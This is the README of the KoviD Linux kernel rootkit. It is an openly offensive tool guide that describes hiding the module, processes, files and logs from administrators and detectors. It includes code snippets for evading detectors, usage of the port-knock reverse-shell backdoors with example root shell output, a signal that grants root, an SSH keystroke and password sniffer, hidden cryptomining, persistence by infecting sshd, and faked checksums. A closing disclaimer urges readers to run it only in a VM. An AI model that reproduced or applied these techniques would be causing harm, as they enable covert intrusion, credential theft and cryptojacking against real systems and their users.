# KoviD LKM

     ██ ▄█▀ ▒█████   ██▒   █▓ ██▓▓█████▄
     ██▄█▒ ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌
    ▓███▄░ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌
    ▓██ █▄ ▒██   ██░  ▒██ █░░░██░░▓█▄   ▌
    ▒██▒ █▄░ ████▓▒░   ▒▀█░  ░██░░▒████▓
    ▒ ▒▒ ▓▒░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒
    ░ ░▒ ▒░  ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒
    ░ ░░ ░ ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░
    ░  ░       ░ ░        ░   ░     ░
                         ░        ░

## 1 - About

    KoviD rootkit is a full-feature LKM intended for use against
    Linux kernel v5+

    Here are some of the features, but not all:

    - Hide itself (module), even from SysFS
    - Provide 4 multi-user shell reverse backdoors
    - Hide processes from proc file system (userspace), not with that
        getdents shit...
        - Properly (overstatement!) handle children, newly created processes and more
    - Hide KauditD logs, syslogs, user presence and so on
    - Hide CPU usage for all hidden tasks - Go Doge!
    - Give r00t (duh!)
    - Hide files and directories
    - etc...

### 1.1 Compatible machines

    CentOS Linux release 8.3.2011
    4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    gcc (GCC) 8.3.1 20191121 (Red Hat 8.3.1-5)

    Debian GNU/Linux 10
    Linux debian10teste 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
    gcc (Debian 8.3.0-6) 8.3.0

    Ubuntu 18.04.5 LTS
    Linux ubuntu 5.4.0-89-generic #100~18.04.1-Ubuntu SMP Wed Sep 29 10:59:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0

    Ubuntu 20.10
    Linux ubuntu 5.8.0-55-generic #62-Ubuntu SMP Tue Jun 1 08:21:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    gcc (Ubuntu 10.3.0-1ubuntu1~20.10) 10.3.0
    ** OpenSSL backdoor somehow don't work:
        "140569241376408:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:362"
        OpenSSL version: OpenSSL 1.1.1f  31 Mar 2020

## 2 - Features

### 2.1 Hide itself (module)

    There are some known tricks out there, the most common by using list_del(modulename).
    This works, however it is trivial and with some rootkits out there you'd have to reboot
    the system in order to unhide (rmmod) the module. In some cases removing the rootkit
    is essential.

    The other issue, that is easily forgotten is that some anti-rootkit detectors
    that look for patterns created by rootkits
    when they execute certain operations, and leave tracks behind. So simply calling
    kernel functions to do our work sometimes is not enough, we need to implement
    these functionalities ourselves (basically stealing kernel code and customizing it)
    as for example the following entry:

```C
    /**
    * We bypass original list_del()
    */
    kv_list_del(this_list.prev, this_list.next);
```

    Why so? Because otherwise I could not have done this:

```C
    /**
     * Swap LIST_POISON in order to trick
     * some rk detectors that will look for
     * the markers set by list_del()
     *
     * It should be OK as long as you don't run
     * list debug on this one (lib/list_debug.c)
     */
    this_list.next = (struct list_head*)LIST_POISON2;
    this_list.prev = (struct list_head*)LIST_POISON1;
```

    Some RK detectors would look for this_list.next == LIST_POISON1

    In the same fashion, hiding RK presence from SysFS (kobjects) is
    often forgotten as loaded modules are listed
    under /sys/module/<loaded module name>

    So a keen sysadmin would just try to match the output of lsmod
    against what is seen under /sys/modules

    For achieving that level of stealthiness we must emulate the
    flow that unloading a module would follow, and that means, again,
    "stealing" some kernel code, and this time for two reasons:
        1. Some of the code is not accessible from the kernel module
        2. Need to change/customize the code path and data

    For example, in order to trick some anti-rk:

```C
    /* So cute that __module_address will return NULL for us
    * that will be forever "loading"... */
    lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
```

    So in this case, our module is forever listed as MODULE_STATE_UNFORMED
    and will be ignored by many anti-rk, and even by some internal kernel shit,
    that will leave the module alone, which is what we want, innit?

    And this it not all, if we want to have a decent RK then everything we
    do, must be undone, if it is our wish, so all these operations need to
    be performed in reverse as well, if for example, we need to rmmod the module.

### 2.2 Hide files and directories

    Normally this is achieved by hooking getdents(64) system call.
    Most implementations that follow this approach end up
    with intrincate code that iterate trhough data, looking for
    patterns and taking decisions. However in Linux kernel v5+ there
    are better and more simple ways to do so, which is by hijacking
    filldir and filldir64. These kernel functions are the ones
    that keep a buffer that holds items, names of directories and files.

    So a function that would have have at least 30<>60 lines of code
    is reduced to 3.

    And it is not only that, what vanishes, must also come back, so KoviD
    keeps a list of whats hidden, can bring them back and also
    the hax0r can just add more to the list, during run-time, cheesy.

### 2.3 Function and syscall hijacking: Ftrace

    We are lucky, kernel v5+ offers a much sweeter way of hooking,
    and best about it is that it is legit, no hacking or dirty tricks
    are involved, the name is Ftrace.

    In the past it was provided by Kprobes directly, however it has been recently
    removed from the kernel but Ftrace is all we need.

    The best thing about it is that we should not fear tail-recurssion
    issues, concurrency, read-only pages and etc, making the module way more stable than
    if we had to worry about these things by using tradicional syscall hooking or
    JMP hijacking. Ftrace is sweet and simple.

    But more important than the method we use to hijack, is what we do with the hijacking ;)

### 2.4 Backdoors

    There exist many approaches to backdooring a system. I chose some
    popular ones because 1) they are popular and 2) they are reliable.

    Basically it consists of CUNT, FUCK and ASS port-knocking.
    For all of them one can use nping (part of nmap tool) to
    generate the desired packets.

    |CUNT           | FUCK      | ASS       |
    |---------------|-----------|-----------|
    |Cwr,Urg,fiN,rsT|Fin,Urg,aCK|Ack,rSt,pSh|

    Whereas CUNT, FUCK or ASS packets are to ports 80, 443 or 444
    will connect back to netcat, openssl s_server and socat sessions.

    Example with encrypted openssl reverse shell:

```bash
    $ sudo ./bdclient.sh openssl 192.168.0.3 9999
    Using default temp DH parameters
    ACCEPT
    -----BEGIN SSL SESSION PARAMETERS-----
    .
    .
    .
    Secure Renegotiation IS supported
    /bin/sh: 0: can't access tty; job control turned off
    # id
    uid=0(root) gid=0(root) groups=0(root)
    #
```

    There are no limits on how many simultaneous sessions are allowed.
    It is worth noting, tho, that exiting from one backdoor session, exits
    all sessions - this is so we make sure to not leave any session hanging
    behind. All backdoor sessions are properly hidden (and their
    children and sub-processes) but we don't want to give chance, a chance.

#### 2.4.1 Client script

    There is a simple script to facilitate: client/bdclient.sh

```bash
 $ ./bdclient.sh
    Error: Missing parameter
    Use: [V=1] ./bdclient.sh <method> <IP> <PORT>

        Methods:
            openssl:    OpenSSL encrypted connect-back shell
            socat:      Socat encrypted connect-back shell
            nc:         Netcat unencrypted connect-back shell
            tty:        Encrypted non-interactive ROOT section sniffing
                        for remote root live terminal commands dump

        IP:
            Remote IP address where rootkit is listening

        Port:
            Local port for connect-back session - must be unfiltered

        Example:
            ./bdclient.sh openssl 192.168.1.10 9999

        Verbose, example:
            V=1 ./bdclient.sh openssl 192.168.1.10 9999

        Connect to GIFT address instead of this machine:
            GIFT=192.168.0.30 ./bdclient.sh openssl 192.168.1.10 443

        If used alongside with GIFT, DRY(run) will NOT send KoviD instruction and will show client's command:
            DRY=true GIFT=192.168.0.30 ./bdclient.sh openssl 192.168.1.44 444

```

    Example:

```bash
      $ sudo ./bdclient.sh nc 192.168.0.3 9999
    Connection from [192.168.0.12] port 9999 [tcp/*] accepted (family 2, sport 42390)
    /bin/sh: 0: can't access tty; job control turned off
    # id
    uid=0(root) gid=0(root) groups=0(root)
    #
```

### 2.5 Tasks

    Perhaps the most important feature of any rootkit is
    hiding processes.

    Hidden processes offer a great deal of freedom about what
    can actually be done with the hacked device.

    If it is a powerful one, for example, a cluster, one
    can hide tools for crypto mining. In other cases one
    can hide tools that are used for snooping users and other
    processes, hide activity and rely on userspace to achieve
    goals not directly implemented by the rootkit, for example
    a keylogger that could well be written for userspace
    and so on.

    Also, great care (well.. I tried) was taken on children processes. It is often
    forgotten, by so called rootkit developers, that tasks
    can generate (fork/clone) other tasks or if the care is
    taken in hiding children, new children created at any
    point in future are forgotten and left hunging around,
    waiting to be found by the system admin.

    There are different ways of hiding processes.
    The most lame approach is to filter out output
    from userland tools like ps or top by hooking
    lame syscalls - this is not the case here.

    If done properly, a hidden process is also
    unkillable, even by r00t itself:

```bash
     $ ./tests/test &
    [1] 14886
    Running 14886 on /tmp/rr.14886
    [ machine<!!! VM !!!> * 10:30:20 (dev) ~/Codes/lkm ]
     $ ps ax |grep 14886
     14886 pts/0    S      0:00 ./tests/test
     14891 pts/0    S+     0:00 grep --color=auto 14886
    [ machine<!!! VM !!!> * 10:30:33 (dev) ~/Codes/lkm ]
     $ echo 14886 >/proc/kovid
    [ machine<!!! VM !!!> * 10:30:39 (dev) ~/Codes/lkm ]
     $ ps ax |grep 14886
     14899 pts/0    S+     0:00 grep --color=auto 14886
    [ machine<!!! VM !!!> * 10:30:41 (dev) ~/Codes/lkm ]
     $ sudo kill -9 14886
    kill: (14886): No such process
    [ machine<!!! VM !!!> * 10:30:48 (dev) ~/Codes/lkm ]
     $ echo 14886 >/proc/kovid
    [ machine<!!! VM !!!> * 10:30:52 (dev) ~/Codes/lkm ]
     $ ps ax |grep 14886
     14886 pts/0    S      0:00 ./tests/test
     14912 pts/0    S+     0:00 grep --color=auto 14886
    [ machine<!!! VM !!!> * 10:30:55 (dev) ~/Codes/lkm ]
     $ fg
    ./tests/test
    ^C
```

    This is so because the task is not hidden from
    userland tools, it is removed from /proc interface
    as a whole, exists only in kernelspace.

    But there is a problem with this approach, if a process
    hidden in such fashion, exits by itself (finished execution or
    whatever) and is hidden, the kernel will complain and will
    be unusable or will dump a g00d 0ld1e stack trace, reveiling us.

    No worries, I've got you covered by hijacking sys_exit_group
    and unhiding the process before it exists, so the links
    to the /proc FS are redone and normal exit routine will work
    as expected. See m_clone() and m_exit_group() in sys.c.

    In fact hidden tasks in KoviD would have deserved its
    own README but I will leave this for another time, for now.

### 2.6 Logs

    Given that hidden tasks will not give away much
    of our presence, some logs will just disappear for free!

    For example, a hidden backdoor will not give away the
    presence as an allocated shell, "w" will not output
    anything because there will be nonthing to output :)

    In debug mode there will be tons of logs in the ring
    buffer (debug printks's in RK) and none in "release" mode.

    In some other cases, for example, there was the need of
    some effort. For example, KauditD would print out
    some warnings in some scenarios, for example, after
    escaliting privileges and becoming r00t, some simple
    operations, like simply calling "man ls" would warn
    on ring buffer, so after some ressearching, I noticed
    that KaudiT function audit_log_start() is the entry
    point for filling out the buffer that will be printed
    out - hijacking that and returning NULL, when I see fit,
    is more than enough to skip those irritating logs ;)

    Relax, there is no: lsmod, ps, w, who, ls /proc/<pid>,
    dmesg and etc that would reveal you.

### 2.7 TCP/UDP logs

    Same for TCP/UDP and networking logs. There are
    some function hijacks that got your ass covered
    and some are for free, thanks to hiding tasks.

    Notice that in above is also included libpcap, used
    by tools like tcpdump and others. There is a catch tho,
    when the connection is initiated it will be shown
    by libpcap, that is so because it happens _BEFORE_
    the rootkit has the chance to hide the process, thus
    knowing it needs to hide that specific connection.
    After connection is stabilished then tcpdump will
    become silent.

    I might solve this issue by creating an intermediary
    step, where hax0r 'tells' the rootkit it is 'going' to
    connect from that specific location - stay tuned!

### 2.8 r00t

    Whatever, nothing special here:
```bash
    kill -SIGCONT 666
```

### 2.9 CPU - hiding/mining

    This is potentially cool: hide your process and start mining, it
    will not be shown as a CPU consumer.

    catch: Never use 100% of CPU, otherwise you'll see
    usr and sys CPU usage splitting 100% to one side or another or
    50% each - that will look weird, be careful and never use all CPUs
    at same time at 100% - If your hacked Linux has only 1 CPU then
    you better look elsewhere.

### 2.10 Persistence

    The option here is achieved using Volundr https://github.com/carloslack/volundr

    KoviD's persist.S can be used to infect a binary, for example, sshd, that
    will be executed after a reboot and load KoviD module.

    Here it is only a suggestion. Persistence can be achieved in several different
    ways, depends on creativity and skills.

    ELF infection on disk is possibly one of the simplest

    There is a helper script under scripts/install.sh
    that automates the process and is simple to use:

```bash
     $ ./scripts/install.sh
    Error: Missing/Invalid parameter
    Use: [override variables] ./install.sh <ELF executable>

    override defaults: VOLUNDR, KOVID, LOADER

    VOLUNDR: point to Volundr directory entry point
        default: ../volundr

    KOVID:  point to KoviD module
        default: ../kovid

    LOADER: point to loader script
        default: ../loadmodule.sh

    Examples:
        # ./install.sh /usr/sbin/sshd
        # VOLUNDR=/tmp/Volundr ./install.sh /usr/sbin/sshd
        # KOVID=/tmp/kovid.ko LOADER=/tmp/loadmodule.sh ./install.sh /usr/sbin/sshd
        $ sudo KOVID=/root/kovid.ko ./install.sh /usr/sbin/sshd

    Before running this script, make sure to:
    KoviD:      build and insmod
    Volundr:    build
```

### 2.11 MD5

    KoviD can fake md5 checksums and in lame but useful way.
    Let's say you applied persistence in binary, ELF infections
    taint the executable and the checksum
    is compromised. Use the rk to fake the output of md5sum command:

    $ echo "-m <checksum after hijack> <old original checksum>

    Useful, however, this implementation has many limitations and only works
    with simple `md5sum` command - keep that in mind.

### 2.12 Base address

    Another little trick that can help exploiting other executables
    is to know their base addresses without having to open() /proc/<pid>/maps:

    $ echo "-b <PID>" >/proc/kovid
    $ cat /proc/kovid

### 2.13 BPF

    KoviD can evade some anti-rk tools based on BPF. More specifically ones
    that look for syscall hooks that rely on analysing BPF kernel stack traces
    via bpf_map_...() interfaces.

    The one anti-rk tool, based on BPF, used for our evasion is:
        https://github.com/pathtofile/bpf-hookdetect.git

## 3 - Usage

### 3.1 /proc/kovid interface

    /proc/kovid is available (but hidden) at insmod
    time, it will fade away after 120 seconds.

    Bring /proc/kovid back after time out:
```bash
    $ kill -SIGCONT 31337
```

    Repeating above command will toggle ON/OFF /proc/kovid
    user interface.

    Usage:
        echo "-[h|s|a|d|l|t0|t1|m0|m1|m|b|f] [argument(s)] >/proc/kovid

        -h: hide kovid module
        -s: show hidden tasks in ring buffer (debug mode only)
        -a <param>: add name (string) of the file/directory to be hidden
        -d <param>: remove name (string) from the list of hidden directories/files
        -l: list files/directories that are currently hidden (debug mode only)
        -t0: flag tty persistence file to be removed when kovid is unloaded
        -t1: flag tty persistence file to NOT be removed when kovid is unloaded (default)
        -m0: flag md5 persistence file to be removed when kovid is unloaded
        -m1: flag md5 persistence file to NOT be removed when kovid is unloaded (default)
        -m <fake_md5 original_md5>: add fake md5sum checksum for to be shown instead of original
        -b <PID>: dump PID's (task) base address in /proc/kovid
        -f <string>: add string/phrase to be hidden from files

### 3.2 Help
    - This README
    - source code

### 3.3 Tasks

    Hiding/Unhiding:
```bash
    $ echo 14886 >/proc/kovid
```

    If task is not hidden, it will, otherwise it will
    be unhidden.

    If you want children to be hidden as well, make
    sure you are hiding the parent instead.

    Show hidden tasks:
```bash
    $ echo show >/proc/kovid
```

    Look at ring buffer (dmesg). Make sure to `dmesg -c` afterwards.

### 3.4 Hide module

    Hiding:
    `$ echo -h >/proc/kovid`

    In 'release' mode KoviD module is hidden by
    default and a 'key' can be shown:
    `$ cat /proc/kovid`

    Hiding:
    `$ echo "random key" >/proc/kovid`

    You can't rmmod KoviD if it is hidden.


### 3.5 Hide/unhide/list files and directories

    Hiding:
    `$ echo '-a name' >/proc/kovid`

    Unhiding:
    `$ echo '-d name' >/proc/kovid`

    Listing hidden files and directory names:
    `$ echo listname >/proc/kovid`

### 3.6 Become r00t

```bash
    $ kill -SIGCONT 666
```

    "id" will show your new creds, if you prefer an 0ld r00t "#" then "su"

### 3.7 SSH/FTP TTY sniffer

    KoviD can snoop SSH session via tty keystrokes, and steaal passwords and commands.
    It works almost the same as socat connect-back backdoor.

```bash
     $ sudo ./bdclient.sh tty 192.168.0.3 9999
    socat[6722] N listening on AF=2 0.0.0.0:9999
    socat[6722] N accepting connection from AF=2 192.168.0.3:50296 on AF=2 192.168.0.12:9999
    socat[6722] N forked off child process 6729
    socat[6722] N listening on AF=2 0.0.0.0:9999
    socat[6729] N no peer certificate and no check
    socat[6729] N SSL connection using DHE-RSA-AES256-GCM-SHA384
    socat[6729] N SSL connection compression "none"
    socat[6729] N SSL connection expansion "none"
    socat[6729] N using stdout for reading and writing
    socat[6729] N starting data transfer loop with FDs [7,7] and [1,1]
    uid.1000 id
    uid.1000 uname -a
    uid.1000 cat /etc/hosts
    uid.1000 ssh fuckit@192.168.0.55
    uid.1000 myhax0rpass
```

## 4 - Bugs

    Many (mostly unknown).

    Ocasional Oops or stack traces are possible, depending on your kernel
    version and other things like security patches and so on, who know? you tell me.

    If you see any issue please report it to me, with
    as much detail as possible, so I can fix.

    Before deploying KoviD in a real target make sure
    to test it extensively, prefereably in a VM that
    emulates what the actual target is - avoid surprises
    at all costs.
    In fact: do `NOT` deploy it, really! Use it as a playground in a VM instead of causing damage to others.

    I take no responsability for any damage caused by this software, perpertrated by any individual - read the `LICENCE`.

    No code is bug-free and no warrant is provided.

